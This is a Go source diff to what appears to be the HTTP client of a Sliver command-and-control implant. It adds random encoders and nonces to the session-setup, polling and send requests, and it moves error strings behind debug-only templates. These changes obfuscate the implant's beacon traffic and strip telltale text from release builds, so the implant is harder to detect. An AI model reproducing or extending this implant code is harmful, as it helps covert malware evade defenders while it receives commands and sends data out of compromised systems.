@@ -169,9 +169,12 @@ func (s *SliverHTTPClient) getPublicKey() *rsa.PublicKey {
 // We do our own POST here because the server doesn't have the
 // session key yet.
 func (s *SliverHTTPClient) getSessionID(sessionInit []byte) error {
-	reader := bytes.NewReader(sessionInit) // Already RSA encrypted
+
+	nonce, encoder := encoders.RandomEncoder()
+	reader := bytes.NewReader(encoder.Encode(sessionInit)) // Already RSA encrypted
+
 	uri := s.jspURL()
-	req := s.newHTTPRequest(http.MethodPost, uri, reader)
+	req := s.newHTTPRequest(http.MethodPost, uri, nonce, reader)
 	// {{if .Debug}}
 	log.Printf("[http] POST -> %s", uri)
 	// {{end}}
@@ -184,7 +187,11 @@ func (s *SliverHTTPClient) getSessionID(sessionInit []byte) error {
 	}
 	respData, _ := ioutil.ReadAll(resp.Body)
 	defer resp.Body.Close()
-	sessionID, err := GCMDecrypt(*s.SessionKey, respData)
+	data, err := encoder.Decode(respData)
+	if err != nil {
+		return err
+	}
+	sessionID, err := GCMDecrypt(*s.SessionKey, data)
 	if err != nil {
 		return err
 	}
@@ -201,7 +208,7 @@ func (s *SliverHTTPClient) Poll() ([]byte, error) {
 		return nil, errors.New("no session")
 	}
 	uri := s.jsURL()
-	req := s.newHTTPRequest(http.MethodGet, uri, nil)
+	req := s.newHTTPRequest(http.MethodGet, uri, encoders.NopNonce(), nil)
 	// {{if .Debug}}
 	log.Printf("[http] POST -> %s", uri)
 	// {{end}}
@@ -232,12 +239,14 @@ func (s *SliverHTTPClient) Send(data []byte) error {
 		return errors.New("no session")
 	}
 	reqData, err := GCMEncrypt(*s.SessionKey, data)
-	reader := bytes.NewReader(reqData)
+
+	nonce, encoder := encoders.RandomEncoder()
+	reader := bytes.NewReader(encoder.Encode(reqData))
 	uri := s.phpURL()
 	// {{if .Debug}}
 	log.Printf("[http] POST -> %s", uri)
 	// {{end}}
-	req := s.newHTTPRequest(http.MethodPost, uri, reader)
+	req := s.newHTTPRequest(http.MethodPost, uri, nonce, reader)
 	resp, err := s.Client.Do(req)
 	if err != nil {
 		// {{if .Debug}}
@@ -246,7 +255,7 @@ func (s *SliverHTTPClient) Send(data []byte) error {
 		return err
 	}
 	if resp.StatusCode != 200 {
-		return errors.New("send failed")
+		return errors.New("{{if .Debug}}HTTP send failed (non-200 resp){{end}}")
 	}
 	return nil
 }
